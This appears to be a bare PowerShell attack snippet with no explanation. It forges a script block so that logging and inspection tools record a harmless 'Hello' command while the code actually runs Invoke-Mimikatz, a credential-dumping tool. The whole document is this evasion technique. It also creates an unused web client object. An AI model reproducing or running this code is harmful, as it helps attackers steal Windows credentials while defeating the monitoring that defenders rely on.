﻿$wc=New-Object System.Net.WebClient
$SpoofedAst = [ScriptBlock]::Create("Write-Output 'Hello'").Ast  
$ExecutedAst = [ScriptBlock]::Create("Invoke-Mimikatz").Ast
$Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent,
                                                                   $null,
                                                                   $null,
                                                                   $null,
                                                                   $ExecutedAst.EndBlock.Copy(),
                                                                   $null)
$Sb = $Ast.GetScriptBlock()

& $Sb
